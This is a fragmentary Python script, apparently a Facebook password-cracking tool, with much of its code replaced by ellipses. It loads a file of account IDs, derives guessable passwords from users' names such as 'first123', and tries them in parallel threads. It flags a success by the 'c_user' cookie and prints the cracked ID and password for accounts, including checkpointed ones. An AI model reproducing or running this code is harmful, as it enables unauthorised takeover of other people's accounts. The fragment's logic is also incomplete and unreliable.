...
'\033[1;33m'[-] GITHUB    :\033[1;32m 𝙰𝙻𝙸-KING
...
def Spy():
	...
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' Put file path \033[93m: ')
		try:
		...
		try:
			...
			ps_limit =1
		print(f'\033[2;36m exp: first last,firtslast,first123')
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f' Total account : \033[133m'+total_ids+f' \n \033[1;37mMethod > \033[1;37mM{mthd}')
			print(f"\033[1;33m' Use flight mode for speed up\033[2;34m'")
			linex()
			for user in fo:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [𝙰𝙻𝙸] %s|\033[1;32mSuccessfull:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [Checkpoint] '+ids+' | '+pas+'\033[2;36m')
...
def ffb3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [𝙰𝙻𝙸 %s|\033[1;32mSuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def ffb4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [𝙰𝙻𝙸] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
